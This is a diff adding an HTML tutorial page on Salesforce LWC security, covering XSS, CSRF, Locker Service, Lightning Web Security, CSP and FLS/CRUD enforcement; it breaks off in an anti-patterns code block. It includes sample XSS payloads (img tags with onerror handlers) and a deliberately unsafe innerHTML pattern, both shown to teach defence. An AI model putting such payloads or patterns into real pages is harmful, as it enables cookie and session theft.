@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>13. Security — LWS, Locker Service &amp; CSP — LWC.guide</title>
+  <meta name="description" content="A first-principles deep-dive into Salesforce LWC security: browser same-origin policy, XSS vectors, Lightning Locker vs Lightning Web Security architecture, CSP directives, FLS/CRUD enforcement, and the security anti-patterns every expert developer must avoid.">
+  <link rel="canonical" href="https://mohakp.github.io/lwc-prep/articles/13-security.html">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../assets/prism.min.css">
+</head>
+<body>
+
+  <!-- ================================================================
+       SITE HEADER
+       ================================================================ -->
+  <header class="site-header" role="banner">
+    <div class="site-header__inner">
+      <a href="../index.html" class="site-logo" aria-label="LWC.guide Home">
+        LWC<span>.</span>guide
+      </a>
+      <nav class="site-nav" aria-label="Site navigation">
+        <button
+          class="theme-toggle"
+          id="themeToggle"
+          aria-label="Toggle dark/light mode"
+          title="Toggle dark/light mode"
+        >
+          <span class="icon-moon" aria-hidden="true">🌙</span>
+          <span class="icon-sun"  aria-hidden="true">☀️</span>
+          <span id="themeLabel">Dark</span>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  <!-- ================================================================
+       ARTICLE LAYOUT (sidebar TOC + main content)
+       ================================================================ -->
+  <div class="article-page">
+
+    <!-- ----- Sticky TOC Sidebar ----- -->
+    <aside class="toc-sidebar" aria-label="Table of contents">
+      <nav class="toc-sidebar__inner">
+        <div class="toc-sidebar__title">Contents</div>
+        <ul class="toc-list" id="tocList">
+          <li><a href="#hook">1. Why Security Matters in LWC</a></li>
+          <li><a href="#browser-security">2. Browser Security Model</a></li>
+          <li class="level-3"><a href="#same-origin">Same-Origin Policy</a></li>
+          <li class="level-3"><a href="#xss">XSS Attack Vectors</a></li>
+          <li class="level-3"><a href="#csrf">CSRF Fundamentals</a></li>
+          <li><a href="#locker">3. Lightning Locker Service</a></li>
+          <li class="level-3"><a href="#locker-architecture">Proxy-Based Architecture</a></li>
+          <li class="level-3"><a href="#locker-restrictions">What Locker Restricted</a></li>
+          <li class="level-3"><a href="#locker-drawbacks">Locker's Performance Cost</a></li>
+          <li><a href="#lws">4. Lightning Web Security (LWS)</a></li>
+          <li class="level-3"><a href="#lws-architecture">Sandbox &amp; API Distortion Architecture</a></li>
+          <li class="level-3"><a href="#lws-namespaces">Namespace Isolation</a></li>
+          <li class="level-3"><a href="#lws-vs-locker">LWS vs Locker Comparison</a></li>
+          <li class="level-3"><a href="#lws-trusted-mode">LWS Trusted Mode</a></li>
+          <li class="level-3"><a href="#lws-adoption">Current Status &amp; Adoption</a></li>
+          <li><a href="#csp">5. Content Security Policy (CSP)</a></li>
+          <li class="level-3"><a href="#csp-header">The CSP HTTP Header</a></li>
+          <li class="level-3"><a href="#csp-directives">Key Directives</a></li>
+          <li class="level-3"><a href="#csp-salesforce">CSP in Salesforce</a></li>
+          <li class="level-3"><a href="#csp-stricter">Stricter CSP Setting</a></li>
+          <li class="level-3"><a href="#csp-static-resources">Static Resources as CSP-Compliant CDN</a></li>
+          <li class="level-3"><a href="#csp-eval">eval() and new Function()</a></li>
+          <li><a href="#fls-crud">6. FLS &amp; CRUD via LDS</a></li>
+          <li class="level-3"><a href="#fls-what">What FLS and CRUD Enforcement Mean</a></li>
+          <li class="level-3"><a href="#fls-wire">Automatic Enforcement via Wire Adapters</a></li>
+          <li class="level-3"><a href="#fls-apex">FLS in Apex — with sharing vs without sharing</a></li>
+          <li class="level-3"><a href="#fls-stripfields">stripInaccessible API</a></li>
+          <li><a href="#anti-patterns">7. Security Anti-Patterns</a></li>
+          <li class="level-3"><a href="#ap-innerhtml">innerHTML and DOM Injection</a></li>
+          <li class="level-3"><a href="#ap-user-css">Trusting User-Supplied CSS</a></li>
+          <li class="level-3"><a href="#ap-document">document.addEventListener Anti-Pattern</a></li>
+          <li class="level-3"><a href="#ap-window-open">window.open and Unvalidated URLs</a></li>
+          <li class="level-3"><a href="#ap-apex-exposure">Over-Exposed Apex Methods</a></li>
+          <li><a href="#pitfalls">8. Pitfall Catalogue</a></li>
+          <li><a href="#p3-insight">9. Expert Insight</a></li>
+          <li><a href="#checklist">10. Security Code Review Checklist</a></li>
+          <li><a href="#recall">11. Quick Recall Card</a></li>
+        </ul>
+      </nav>
+    </aside>
+
+    <!-- ----- Main Article Content ----- -->
+    <main class="article-main" id="articleMain">
+
+      <!-- Article Header -->
+      <header class="article-header">
+        <div class="article-breadcrumb">
+          <a href="../index.html">← All Articles</a>
+        </div>
+        <div class="article-number">Article 13</div>
+        <h1>Security: LWS, Locker Service &amp; CSP</h1>
+        <div class="article-meta">
+          <span>⏱ 26 min read</span>
+          <span class="tags">
+            <span class="tag">#security</span>
+            <span class="tag">#lws</span>
+            <span class="tag">#csp</span>
+          </span>
+        </div>
+        <button
+          class="mark-read-btn"
+          id="markReadBtn"
+          data-article-id="13"
+          aria-pressed="false"
+        >Mark as Read</button>
+      </header>
+
+      <!-- ============================================================
+           SECTION 1 — HOOK
+           ============================================================ -->
+      <section id="hook">
+        <h2>1. Why Security Matters in LWC</h2>
+        <p>
+          Salesforce is a multi-tenant platform. Your code and a competitor's AppExchange package
+          can run side-by-side inside the same browser tab, sharing the same <code>window</code>
+          and <code>document</code>. Without a security layer, malicious code in one namespace
+          could read data from another component — or worse, exfiltrate session tokens and
+          impersonate the user.
+        </p>
+        <p>
+          This is not a hypothetical risk. The web's history is littered with XSS attacks that
+          stole cookies and session data, CSRF attacks that forged requests, and prototype
+          pollution that hijacked JavaScript itself. Salesforce's security architecture exists
+          precisely to prevent all of these in an environment where code from many authors
+          coexists at runtime.
+        </p>
+        <p>
+          To understand Salesforce's security model deeply, you need to start from the browser's
+          own security rules — the same-origin policy and the Content Security Policy header —
+          and then layer on what Salesforce added: Lightning Locker, Lightning Web Security (LWS),
+          and Field-Level Security (FLS) enforcement. A expert developer doesn't just avoid mistakes;
+          they understand <em>why</em> the restrictions exist, can diagnose security errors
+          immediately, and can make architectural decisions that keep apps secure by design.
+        </p>
+      </section>
+
+      <!-- ============================================================
+           SECTION 2 — BROWSER SECURITY MODEL
+           ============================================================ -->
+      <section id="browser-security">
+        <h2>2. Browser Security Model</h2>
+
+        <h3 id="same-origin">Same-Origin Policy</h3>
+        <p>
+          The same-origin policy (SOP) is the oldest and most foundational browser security rule.
+          Two URLs share the same origin if and only if their <strong>protocol</strong>,
+          <strong>host</strong>, and <strong>port</strong> are all identical:
+        </p>
+        <pre><code class="language-text">https://acme.my.salesforce.com/  ← origin A
+https://acme.my.salesforce.com/apex/MyPage  ← same origin as A ✓
+http://acme.my.salesforce.com/   ← different protocol ✗
+https://evil.example.com/        ← different host ✗
+https://acme.my.salesforce.com:8443/ ← different port ✗</code></pre>
+        <p>
+          SOP governs what JavaScript can <em>read</em> from resources loaded from other origins.
+          A script from <code>evil.com</code> embedded in a page can make a <em>request</em> to
+          <code>salesforce.com</code>, but it cannot read the response unless CORS headers allow it.
+          This stops cookie theft across origins — but it does nothing if the malicious script
+          is injected <em>into</em> the same origin (XSS).
+        </p>
+
+        <h3 id="xss">XSS Attack Vectors</h3>
+        <p>
+          Cross-Site Scripting (XSS) is the most common web vulnerability. An attacker injects
+          malicious JavaScript into a trusted page. When a victim visits that page, the script
+          executes with full access to the DOM, cookies, and session storage of that origin.
+        </p>
+        <p>There are three classic XSS variants:</p>
+        <ul>
+          <li>
+            <strong>Stored XSS</strong> — Malicious input is persisted to a database (e.g. a
+            Salesforce record field) and later rendered without escaping. The victim triggers it
+            simply by viewing the record.
+          </li>
+          <li>
+            <strong>Reflected XSS</strong> — Malicious input appears in the URL query string and
+            is reflected directly into the page HTML without sanitisation.
+          </li>
+          <li>
+            <strong>DOM-based XSS</strong> — JavaScript reads a dangerous source
+            (<code>location.hash</code>, <code>document.referrer</code>) and writes it directly
+            into the DOM via <code>innerHTML</code> or <code>document.write</code>, without any
+            server involvement.
+          </li>
+        </ul>
+        <p>
+          In LWC, the most dangerous XSS vector is <strong>DOM-based XSS via
+          <code>innerHTML</code></strong>. Any time you write user-controlled content directly
+          to the DOM with <code>innerHTML</code>, you open a potential injection point:
+        </p>
+        <pre><code class="language-javascript">// DANGEROUS — never do this
+connectedCallback() {
+  this.template.querySelector('.output').innerHTML = this.userInput;
+  // If userInput = '&lt;img src=x onerror="stealCookies()"&gt;'
+  // the browser executes the onerror script immediately
+}</code></pre>
+        <p>
+          LWC's templating engine defends against this by default: <code>{expression}</code>
+          in templates is <em>text-bound</em>, not HTML-bound. The platform escapes HTML
+          characters before inserting them into the DOM. This means
+          <code>&lt;img onerror="..."&gt;</code> becomes harmless text, not an executable tag.
+        </p>
+
+        <h3 id="csrf">CSRF Fundamentals</h3>
+        <p>
+          Cross-Site Request Forgery (CSRF) tricks an authenticated user's browser into making
+          a request to a trusted site without the user's knowledge. In traditional web apps, a
+          victim clicking a link on <code>evil.com</code> could trigger a state-changing request
+          to <code>salesforce.com</code> using the victim's session cookie.
+        </p>
+        <p>
+          Salesforce mitigates CSRF for Apex REST endpoints via the
+          <code>X-SFDC-Session</code> token. Lightning components operate within the Lightning
+          loopback framework which handles CSRF tokens transparently — you rarely need to manage
+          this manually in LWC, but you must know it exists.
+        </p>
+      </section>
+
+      <!-- ============================================================
+           SECTION 3 — LIGHTNING LOCKER SERVICE
+           ============================================================ -->
+      <section id="locker">
+        <h2>3. Lightning Locker Service</h2>
+        <p>
+          Lightning Locker was Salesforce's first solution to the multi-tenant JavaScript
+          isolation problem. It was introduced in 2016 to allow AppExchange packages to coexist
+          safely in the same Lightning page. Locker enforced isolation using a technique called
+          <strong>secure wrappers and proxy objects</strong>.
+        </p>
+
+        <h3 id="locker-architecture">Proxy-Based Architecture</h3>
+        <p>
+          Every object that crossed a Locker boundary — whether a DOM element, the
+          <code>window</code> object, or a custom component's public API — was wrapped in an
+          ES5 Proxy. The proxy intercepted every property access and method call, checked
+          whether the accessing namespace was allowed to reach that object, and either allowed
+          or denied the operation.
+        </p>
+        <p>
+          This meant that code in namespace <code>c</code> could not directly read properties
+          from a DOM element owned by namespace <code>acme</code> unless Locker explicitly
+          permitted it. The isolation was <em>object-level</em> rather than <em>realm-level</em>.
+        </p>
+        <pre><code class="language-javascript">// Under Locker — namespace c tries to access another namespace's element
+// The proxy detects the cross-namespace access and throws:
+// "Blocked attempt to read a cross-origin property of a DOM element"
+const foreignEl = document.querySelector('acme-widget');
+foreignEl.someProperty; // ← blocked by Locker proxy</code></pre>
+
+        <h3 id="locker-restrictions">What Locker Restricted</h3>
+        <p>Locker blocked a wide range of operations that are legal in vanilla JS:</p>
+        <ul>
+          <li>Creating custom elements and using third-party web components</li>
+          <li>Direct use of <code>__proto__</code> manipulation</li>
+          <li>Many APIs on <code>window</code> and <code>document</code> from cross-namespace scripts</li>
+          <li><code>eval()</code> and <code>new Function()</code></li>
+          <li>Using <code>innerHTML</code> with non-trivial HTML content</li>
+          <li>Most DOM traversal that crossed namespace boundaries</li>
+        </ul>
+        <p>
+          These restrictions made many popular third-party JavaScript libraries incompatible
+          with Locker, or required patching and workarounds. The Locker Service compatibility
+          testing was a significant bottleneck for AppExchange publishers.
+        </p>
+
+        <h3 id="locker-drawbacks">Locker's Performance Cost</h3>
+        <p>
+          Every proxy operation carries a runtime cost. When deeply nested object graphs (like
+          the DOM tree) are proxied, the overhead compounds. Benchmarks showed Locker could
+          increase DOM manipulation time by 3–10× in complex scenarios. This was the most
+          cited complaint from developers — Locker was secure, but slow.
+        </p>
+        <p>
+          Locker Service is now <strong>deprecated for LWC</strong>. It still applies to Aura
+          components in orgs that have not yet migrated, but all new LWC development runs under
+          Lightning Web Security instead.
+        </p>
+      </section>
+
+      <!-- ============================================================
+           SECTION 4 — LIGHTNING WEB SECURITY (LWS)
+           ============================================================ -->
+      <section id="lws">
+        <h2>4. Lightning Web Security (LWS)</h2>
+        <p>
+          Lightning Web Security was designed from scratch to solve the same multi-tenant
+          isolation problem as Locker, but using a fundamentally different technique —
+          one borrowed from browser engine design: <strong>sandboxed JavaScript realms</strong>.
+        </p>
+
+        <h3 id="lws-architecture">Sandbox &amp; API Distortion Architecture</h3>
+        <p>
+          Instead of wrapping every object in a runtime proxy, LWS uses a
+          <strong>virtualization engine</strong> that creates an isolated JavaScript realm for
+          each namespace. A <em>realm</em> in JavaScript terms is an independent execution
+          context with its own global object, prototype chain, and built-in objects.
+        </p>
+        <p>
+          Within this realm, LWS applies <strong>API distortions</strong> — it rewrites how
+          certain standard JavaScript APIs behave to filter or block unsafe operations:
+        </p>
+        <ul>
+          <li><strong>Filter:</strong> Reads from certain properties are cleaned or restricted</li>
+          <li><strong>Sanitise:</strong> Writes to dangerous properties (like <code>innerHTML</code>) are automatically sanitised</li>
+          <li><strong>Block:</strong> Some API calls are fully prevented</li>
+          <li><strong>Redirect:</strong> API calls are silently redirected to safe equivalents</li>
+        </ul>
+        <pre><code class="language-javascript">// Under LWS — innerHTML write is distorted at the API level
+// LWS sanitises the HTML before inserting it into the DOM
+element.innerHTML = '&lt;img src=x onerror="alert(1)"&gt;';
+// LWS strips the onerror handler → &lt;img src=x&gt; is inserted, script doesn't run
+
+// Note: This is a safety net — you should NEVER rely on it as your only defence.
+// Write code that doesn't use innerHTML with untrusted content in the first place.</code></pre>
+        <p>
+          Because LWS operates at the realm level rather than the individual-object level, the
+          native performance of property access and method calls is preserved. The
+          <code>window</code>, <code>document</code>, and DOM element objects in the LWS sandbox
+          are the <em>actual</em> platform objects (not proxies), viewed through a distorted lens.
+        </p>
+
+        <h3 id="lws-namespaces">Namespace Isolation</h3>
+        <p>
+          Each Salesforce namespace gets its own detached LWS sandbox. Code in the <code>c</code>
+          namespace cannot directly call functions or read variables declared in the
+          <code>mypackage</code> namespace — even if they are defined on the same JavaScript
+          global. Cross-namespace communication must go through the defined public contracts:
+          <code>@api</code> properties, custom events, or LMS.
+        </p>
+        <p>
+          This namespace-level sandbox eliminates an entire class of attacks where malicious code
+          in one package tries to read private state from another package by traversing the
+          prototype chain or querying shared globals.
+        </p>
+
+        <h3 id="lws-vs-locker">LWS vs Locker Comparison</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Dimension</th>
+                <th>Lightning Locker</th>
+                <th>Lightning Web Security</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Isolation technique</td>
+                <td>Proxy wrappers on every object</td>
+                <td>Separate JS realm per namespace + API distortions</td>
+              </tr>
+              <tr>
+                <td>Performance</td>
+                <td>High overhead (proxy on every access)</td>
+                <td>Near-native (no proxy overhead)</td>
+              </tr>
+              <tr>
+                <td>Custom Elements support</td>
+                <td>Blocked</td>
+                <td>Allowed</td>
+              </tr>
+              <tr>
+                <td>Third-party libraries</td>
+                <td>Many incompatible</td>
+                <td>Most compatible (fewer API blocks)</td>
+              </tr>
+              <tr>
+                <td>window / document access</td>
+                <td>Wrapped secure versions</td>
+                <td>Native objects in the sandbox</td>
+              </tr>
+              <tr>
+                <td>Standards alignment</td>
+                <td>Custom, diverging from spec</td>
+                <td>Models TC39 / W3C standards evolution</td>
+              </tr>
+              <tr>
+                <td>Applies to</td>
+                <td>Aura + LWC (legacy)</td>
+                <td>LWC (default since Winter '23); Aura (Summer '23+)</td>
+              </tr>
+              <tr>
+                <td>Status</td>
+                <td>Deprecated for LWC</td>
+                <td>Current standard</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="lws-trusted-mode">LWS Trusted Mode</h3>
+        <p>
+          By default, LWS applies a strict set of API distortions to all namespaces. For
+          packages that have a proven track record and need to operate with fewer restrictions,
+          Salesforce provides <strong>LWS Trusted Mode</strong>. When a namespace is granted
+          Trusted Mode status, the distortions are relaxed — the code can access more platform
+          APIs directly and interact with the DOM in ways that untrusted code cannot.
+        </p>
+        <p>
+          Trusted Mode is not something you can self-enable. It must be granted by Salesforce
+          review (relevant for AppExchange publishers). For standard custom org development,
+          your <code>c</code> namespace always operates under standard LWS restrictions.
+        </p>
+
+        <h3 id="lws-adoption">Current Status &amp; Adoption</h3>
+        <p>
+          LWS became generally available in <strong>Summer '23</strong> for both LWC and Aura.
+          All new Salesforce orgs created after Winter '23 have LWS enabled by default for LWC.
+          Existing orgs with LWC on Locker can opt in to LWS via Setup → Security → Lightning
+          Web Security. Salesforce has stated that all future security investment will go into
+          LWS rather than Locker.
+        </p>
+        <p>
+          From a developer perspective, the migration from Locker to LWS is mostly transparent
+          for well-written LWC code. The most common migration issues arise from:
+        </p>
+        <ul>
+          <li>Code that relied on Locker's secure wrappers to coerce objects across namespaces</li>
+          <li>Third-party libraries that worked on Locker because it silently polyfilled certain APIs</li>
+          <li>Components that used <code>document.querySelectorAll</code> expecting to find elements from other namespaces</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================
+           SECTION 5 — CONTENT SECURITY POLICY
+           ============================================================ -->
+      <section id="csp">
+        <h2>5. Content Security Policy (CSP)</h2>
+        <p>
+          Content Security Policy is an HTTP response header that tells the browser which
+          sources of content (scripts, styles, images, fonts, iframes) are allowed to load
+          on a given page. It is the primary defence against XSS because it prevents
+          injected scripts from executing even if the attacker manages to get malicious HTML
+          into the DOM.
+        </p>
+
+        <h3 id="csp-header">The CSP HTTP Header</h3>
+        <p>
+          Salesforce sends a <code>Content-Security-Policy</code> header with every Lightning
+          page response. You cannot modify this header directly (it's set server-side), but you
+          can configure certain aspects through Salesforce Setup, and you can observe it in the
+          browser's Network tab.
+        </p>
+        <p>
+          A typical CSP header looks like:
+        </p>
+        <pre><code class="language-text">Content-Security-Policy:
+  default-src 'self' https://acme.my.salesforce.com;
+  script-src  'self' https://static.acme.salesforce.com;
+  style-src   'self' 'unsafe-inline' https://static.acme.salesforce.com;
+  img-src     'self' data: https:;
+  connect-src 'self' https://api.acme.com;
+  frame-src   'none';</code></pre>
+
+        <h3 id="csp-directives">Key Directives</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Directive</th>
+                <th>Controls</th>
+                <th>Notes</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>default-src</code></td>
+                <td>Fallback for all content types</td>
+                <td>Applied when a specific directive is not set</td>
+              </tr>
+              <tr>
+                <td><code>script-src</code></td>
+                <td>JavaScript sources</td>
+                <td>Key directive; blocks inline scripts and eval by default</td>
+              </tr>
+              <tr>
+                <td><code>style-src</code></td>
+                <td>CSS sources</td>
+                <td>Inline styles blocked unless <code>'unsafe-inline'</code> is set</td>
+              </tr>
+              <tr>
+                <td><code>connect-src</code></td>
+                <td>fetch, XHR, WebSocket endpoints</td>
+                <td>Must include Apex API and any callout endpoints</td>
+              </tr>
+              <tr>
+                <td><code>img-src</code></td>
+                <td>Image sources</td>
+                <td><code>data:</code> allows Base64 encoded images</td>
+              </tr>
+              <tr>
+                <td><code>frame-src</code></td>
+                <td>iframe sources</td>
+                <td>Set to <code>'none'</code> to block framing entirely</td>
+              </tr>
+              <tr>
+                <td><code>worker-src</code></td>
+                <td>Web Worker and Service Worker scripts</td>
+                <td>Required if using Web Workers in LWC</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p>
+          Two special source values are security-critical:
+        </p>
+        <ul>
+          <li>
+            <code>'unsafe-inline'</code> — Allows inline scripts and event handlers
+            (<code>onclick="..."</code>). <strong>Never add this to <code>script-src</code></strong>
+            without strong justification; it defeats the primary XSS protection.
+          </li>
+          <li>
+            <code>'unsafe-eval'</code> — Allows <code>eval()</code>, <code>new Function()</code>,
+            and <code>setTimeout('string')</code>. Blocked by default in Salesforce.
+          </li>
+        </ul>
+
+        <h3 id="csp-salesforce">CSP in Salesforce</h3>
+        <p>
+          Salesforce maintains a platform-level CSP policy that you build on top of. The key
+          constraint for developers is that the platform's <code>script-src</code> does
+          <em>not</em> include <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code>.
+          This means:
+        </p>
+        <ul>
+          <li>You cannot inject <code>&lt;script&gt;</code> tags dynamically at runtime</li>
+          <li>You cannot use <code>eval()</code> or <code>new Function()</code></li>
+          <li>You cannot use inline event handlers in HTML templates (<code>onclick="doThis()"</code>)</li>
+          <li>Third-party scripts loaded via CDN must be approved via CSP Trusted Sites</li>
+        </ul>
+        <p>
+          When you need to load a third-party script (e.g. Chart.js), the correct approach is:
+        </p>
+        <ol>
+          <li>Download the library file</li>
+          <li>Upload it as a Static Resource in Salesforce Setup</li>
+          <li>Load it via <code>lightning/platformResourceLoader</code> in your component</li>
+          <li>Add the library's domain to CSP Trusted Sites <em>only</em> if you absolutely need to load it from a CDN</li>
+        </ol>
+
+        <h3 id="csp-stricter">Stricter CSP Setting</h3>
+        <p>
+          Salesforce provides an org-wide setting: <strong>Enable Stricter Content Security
+          Policy</strong> (Setup → Session Settings). When enabled:
+        </p>
+        <ul>
+          <li>The <code>unsafe-inline</code> source is removed from <code>script-src</code></li>
+          <li>Inline <code>&lt;script&gt;</code> blocks in Visualforce pages are blocked</li>
+          <li>Inline event handlers in HTML attributes are blocked</li>
+          <li>Only scripts loaded from approved sources (<code>'self'</code> and Static Resources) execute</li>
+        </ul>
+        <p>
+          This setting is now <strong>enabled by default in new orgs</strong>. If your org was
+          created before it became default, you should enable it proactively. The most common
+          consequence of enabling it is that legacy Visualforce or JavaScript buttons that use
+          inline scripts will break — this is the desired behaviour, as those patterns are
+          insecure.
+        </p>
+        <p>
+          LWC is designed to work correctly with Stricter CSP enabled. The LWC compiler
+          rejects inline scripts in templates at build time, long before CSP would block them
+          at runtime.
+        </p>
+
+        <h3 id="csp-static-resources">Static Resources as CSP-Compliant CDN</h3>
+        <p>
+          Static Resources (Setup → Static Resources) are served from
+          <code>*.salesforce.com</code> or the equivalent My Domain URL — a domain already
+          included in Salesforce's <code>script-src</code>. This makes Static Resources the
+          recommended mechanism for all third-party JavaScript in LWC:
+        </p>
+        <pre><code class="language-javascript">// myComponent.js
+import { LightningElement } from 'lwc';
+import { loadScript, loadStyle } from 'lightning/platformResourceLoader';
+import CHARTJS from '@salesforce/resourceUrl/chartjs'; // Static Resource name
+
+export default class MyComponent extends LightningElement {
+  chartjsInitialized = false;
+
+  renderedCallback() {
+    if (this.chartjsInitialized) return;
+    this.chartjsInitialized = true;
+
+    loadScript(this, CHARTJS + '/chart.min.js')
+      .then(() => {
+        // Chart.js is now available on window.Chart
+        this.initChart();
+      })
+      .catch(error => {
+        console.error('Failed to load Chart.js', error);
+      });
+  }
+
+  initChart() {
+    const ctx = this.template.querySelector('canvas').getContext('2d');
+    new window.Chart(ctx, {
+      type: 'bar',
+      data: { /* ... */ }
+    });
+  }
+}</code></pre>
+        <p>
+          The <code>_initialized</code> guard in <code>renderedCallback</code> is critical —
+          without it, the script would be re-appended to the DOM on every re-render, causing
+          duplicate library registrations and memory leaks.
+        </p>
+
+        <h3 id="csp-eval">eval() and new Function()</h3>
+        <p>
+          Both <code>eval()</code> and <code>new Function()</code> execute strings as code.
+          Both are blocked by CSP (they fall under the <code>'unsafe-eval'</code> source that
+          Salesforce explicitly excludes). Additionally, LWS itself blocks <code>eval()</code>
+          within its sandboxes regardless of CSP.
+        </p>
+        <p>
+          Common legitimate use-cases for <code>eval()</code> and their secure alternatives:
+        </p>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Original (unsafe)</th>
+                <th>Secure alternative</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>eval(jsonString)</code></td>
+                <td><code>JSON.parse(jsonString)</code></td>
+              </tr>
+              <tr>
+                <td><code>eval('2 + 2')</code> (dynamic math)</td>
+                <td>Parse the expression manually or use a safe math library</td>
+              </tr>
+              <tr>
+                <td><code>new Function('x', 'return ' + expr)</code></td>
+                <td>Refactor to a lookup table or switch statement</td>
+              </tr>
+              <tr>
+                <td><code>setTimeout('code()', 1000)</code></td>
+                <td><code>setTimeout(() =&gt; code(), 1000)</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- ============================================================
+           SECTION 6 — FLS & CRUD
+           ============================================================ -->
+      <section id="fls-crud">
+        <h2>6. FLS &amp; CRUD via LDS</h2>
+
+        <h3 id="fls-what">What FLS and CRUD Enforcement Mean</h3>
+        <p>
+          Salesforce's data security model has three tiers:
+        </p>
+        <ol>
+          <li>
+            <strong>Object-level security (CRUD)</strong> — Does this user have permission to
+            Create, Read, Update, or Delete records of this object type?
+          </li>
+          <li>
+            <strong>Field-Level Security (FLS)</strong> — For fields the user can read the object,
+            is this specific field visible and/or editable to them?
+          </li>
+          <li>
+            <strong>Record-level security</strong> — Sharing rules, owner-based sharing,
+            manual sharing — which specific record instances can the user see?
+          </li>
+        </ol>
+        <p>
+          These permissions are set in Salesforce by admins via Profiles and Permission Sets. When
+          your code retrieves or modifies data, it is your responsibility (and in some cases the
+          platform's) to enforce them.
+        </p>
+
+        <h3 id="fls-wire">Automatic Enforcement via Wire Adapters</h3>
+        <p>
+          The <strong>Lightning Data Service (LDS)</strong> and its wire adapters automatically
+          respect FLS and CRUD at the data layer. When you call <code>getRecord</code>
+          and request a field the current user cannot see, LDS silently omits that field from the
+          response — it does not throw an error. This is intentional and mimics the behaviour of
+          the UI API (which LDS wraps).
+        </p>
+        <pre><code class="language-javascript">// js
+import { LightningElement, wire } from 'lwc';
+import { getRecord, getFieldValue } from 'lightning/uiRecordApi';
+import SALARY_FIELD from '@salesforce/schema/Contact.Salary__c';
+
+export default class ContactDetail extends LightningElement {
+  @api recordId;
+
+  @wire(getRecord, { recordId: '$recordId', fields: [SALARY_FIELD] })
+  contact;
+
+  get salary() {
+    // If user doesn't have FLS read on Salary__c, this returns undefined
+    // No error thrown — the field just isn't in the response
+    return getFieldValue(this.contact.data, SALARY_FIELD);
+  }
+}</code></pre>
+        <p>
+          This is an important distinction: you must <strong>guard against undefined field
+          values</strong> in your LWC code, because FLS may cause fields to be absent from
+          the wire response even when the record itself was fetched successfully.
+        </p>
+        <p>
+          Similarly, CRUD operations via LDS wire adapters (<code>createRecord</code>,
+          <code>updateRecord</code>, <code>deleteRecord</code>) will fail with a
+          <code>403</code> error if the user lacks the required object permission. Always
+          handle the error case in your component.
+        </p>
+
+        <h3 id="fls-apex">FLS in Apex — with sharing vs without sharing</h3>
+        <p>
+          When you use <code>@AuraEnabled</code> Apex methods, FLS is <em>not</em> automatically
+          enforced by default. Apex runs in system context by default (like a server-side admin
+          user). This means poorly written Apex can expose data that the running user should not
+          be able to see.
+        </p>
+        <p>
+          The key keywords:
+        </p>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Declaration</th>
+                <th>Record Visibility</th>
+                <th>FLS</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>with sharing</code></td>
+                <td>Enforces sharing rules — user only sees records they can access</td>
+                <td>NOT enforced (must do manually)</td>
+              </tr>
+              <tr>
+                <td><code>without sharing</code></td>
+                <td>Bypasses sharing rules — all records visible</td>
+                <td>NOT enforced</td>
+              </tr>
+              <tr>
+                <td><code>inherited sharing</code></td>
+                <td>Inherits the sharing context of the calling code</td>
+                <td>NOT enforced</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p>
+          <strong>The rule:</strong> Always declare <code>with sharing</code> in Apex classes
+          called from LWC unless you have a specific architectural reason not to. And FLS must be
+          enforced <em>manually</em> in Apex using the <code>Security.stripInaccessible</code>
+          API or <code>Schema.DescribeFieldResult.isAccessible()</code>.
+        </p>
+        <pre><code class="language-apex">// Apex — manual FLS enforcement for a SOQL query
+public with sharing class ContactController {
+    @AuraEnabled(cacheable=true)
+    public static List&lt;Contact&gt; getContacts() {
+        // 1. Run the query in system context (full field access)
+        List&lt;Contact&gt; contacts = [
+            SELECT Id, FirstName, LastName, Email, Salary__c
+            FROM Contact
+            LIMIT 200
+        ];
+
+        // 2. Strip fields the running user cannot read
+        SObjectAccessDecision stripped = Security.stripInaccessible(
+            AccessType.READABLE,
+            contacts
+        );
+
+        return stripped.getRecords(); // Fields user can't see are removed
+    }
+}</code></pre>
+
+        <h3 id="fls-stripfields">stripInaccessible API</h3>
+        <p>
+          <code>Security.stripInaccessible()</code> takes two arguments:
+        </p>
+        <ul>
+          <li>
+            <strong><code>AccessType</code></strong> — <code>READABLE</code>,
+            <code>CREATABLE</code>, <code>UPDATABLE</code>, or <code>UPSERTABLE</code>,
+            corresponding to the operation you are performing.
+          </li>
+          <li>
+            <strong>The records</strong> — a List of SObjects to sanitise.
+          </li>
+        </ul>
+        <p>
+          It returns an <code>SObjectAccessDecision</code> object. Call
+          <code>.getRecords()</code> to get the sanitised list and
+          <code>.getRemovedFields()</code> to see which fields were stripped (useful for
+          logging security decisions).
+        </p>
+        <p>
+          A expert developer uses <code>stripInaccessible</code> consistently for all exposed Apex
+          methods. The alternative — manual <code>Schema.DescribeFieldResult</code> checks per
+          field — is verbose, error-prone, and doesn't scale.
+        </p>
+      </section>
+
+      <!-- ============================================================
+           SECTION 7 — SECURITY ANTI-PATTERNS
+           ============================================================ -->
+      <section id="anti-patterns">
+        <h2>7. Security Anti-Patterns</h2>
+
+        <h3 id="ap-innerhtml">innerHTML and DOM Injection</h3>
+        <p>
+          <code>innerHTML</code> is the most dangerous API in the browser's DOM toolkit.
+          Any HTML string written to <code>innerHTML</code> that contains a
+          <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, or an event handler attribute
+          can lead to XSS. Even if LWS sanitises the write, you are relying on a security layer
+          that could change. Write your code so that the threat never materialises in the first
+          place.
+        </p>
+        <pre><code class="language-javascript">// ❌ Anti-pattern: innerHTML with dynamic content
